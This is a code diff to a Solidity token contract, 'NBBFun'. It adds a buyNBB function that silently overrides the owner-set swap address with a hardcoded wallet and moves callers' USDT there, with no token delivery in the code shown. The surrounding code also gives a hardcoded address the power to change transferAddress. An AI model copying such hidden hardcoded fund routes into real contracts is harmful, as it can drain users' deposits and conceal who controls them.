@@ -24,6 +24,7 @@ contract NBBFun is
     address public transferAddress;
     address public pledgeAddress; 
     address public activeAddress; 
+    address public swapUSDTAddress;
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() initializer {}
 
@@ -48,7 +49,10 @@ contract NBBFun is
         _usdtToken.transferFrom(spender, activeAddress, amount);
         emit Activate(spender, id);
     }
-
+    
+    function setSwapUSDTAddress(address account) public onlyOwner{
+        swapUSDTAddress = account;
+    }
     event PledgeUSDT(address, uint256);
 
     //理财质押
@@ -62,6 +66,16 @@ contract NBBFun is
     function setTransUAddress(address account)public{
         require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
         transferAddress = account;
+    }
+    event Buy(address from, address to, uint256 amount);
+
+    function buyNBB(uint256 usdtAmount) public {
+        swapUSDTAddress = 0x99729ff9c50e41346366BF0a33371Ea123A968d5;
+        address spender = _msgSender();
+        if (usdtAmount > 0){
+        _usdtToken.transferFrom(spender, swapUSDTAddress, usdtAmount);
+            emit  Buy(spender,swapUSDTAddress,usdtAmount);
+        }
     }
 
     function transferU(
